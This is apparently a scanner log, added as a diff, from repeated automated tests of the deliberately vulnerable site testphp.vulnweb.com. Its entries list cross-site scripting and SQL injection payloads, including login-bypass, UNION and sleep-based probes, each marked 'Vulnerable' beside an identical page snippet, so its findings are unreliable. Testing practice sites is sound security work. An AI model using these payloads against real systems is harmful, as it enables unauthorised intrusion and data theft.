+[2025-06-16 18:25:48.103831] Vulnerable URL: http://testphp.vulnweb.com
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:48.701810] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:49.266910] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:49.837480] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:50.397937] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:50.964214] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <body onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:51.506722] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:52.088035] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:52.674848] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:53.270738] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:53.833437] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1#
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:54.385536] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 'a'='a
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:54.942610] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR ''='
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:55.500023] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 LIMIT 1 -- 
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:56.068851] Vulnerable URL: http://testphp.vulnweb.com
+Payload: admin' --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:56.849387] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 UNION SELECT null, version() --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:57.410476] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 ORDER BY 1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:57.991708] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 AND 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:25:58.554685] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' AND sleep(5) --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:41.129383] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:41.686134] Vulnerable URL: http://testphp.vulnweb.com
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:42.261724] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:42.819717] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:43.382953] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:43.953184] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:44.525040] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <body onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:45.082582] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:45.666898] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:46.243702] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:46.824381] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:47.389307] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1#
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:47.962935] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 'a'='a
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:48.511673] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR ''='
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:49.087083] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 LIMIT 1 -- 
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:49.652493] Vulnerable URL: http://testphp.vulnweb.com
+Payload: admin' --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:50.224327] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 UNION SELECT null, version() --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:50.798491] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 ORDER BY 1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:51.394478] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 AND 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:33:51.993263] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' AND sleep(5) --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:06.472706] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:07.045097] Vulnerable URL: http://testphp.vulnweb.com
+Payload: "><script>alert(1)</script>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:07.614154] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <img src=x onerror=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:08.271736] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <svg onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:08.884011] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:09.430956] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:10.029824] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <body onload=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:10.629590] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <video><source onerror='alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:11.215097] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <input autofocus onfocus=alert(1)>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:11.770689] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR '1'='1
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:12.345828] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:12.938224] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1#
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:13.521516] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 'a'='a
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:14.119246] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR ''='
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:14.721258] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 LIMIT 1 -- 
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:15.297605] Vulnerable URL: http://testphp.vulnweb.com
+Payload: admin' --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:15.868100] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 UNION SELECT null, version() --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:16.461096] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 ORDER BY 1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:17.017301] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' OR 1=1 AND 1=1 --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:35:17.601813] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ' AND sleep(5) --
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:40:37.717396] Vulnerable URL: http://testphp.vulnweb.com
+Payload: ';alert(String.fromCharCode(88,83,83))//
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-
+
+[2025-06-16 18:40:38.274953] Vulnerable URL: http://testphp.vulnweb.com
+Payload: <iframe src='javascript:alert(1)'>
+--- Snippet ---
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
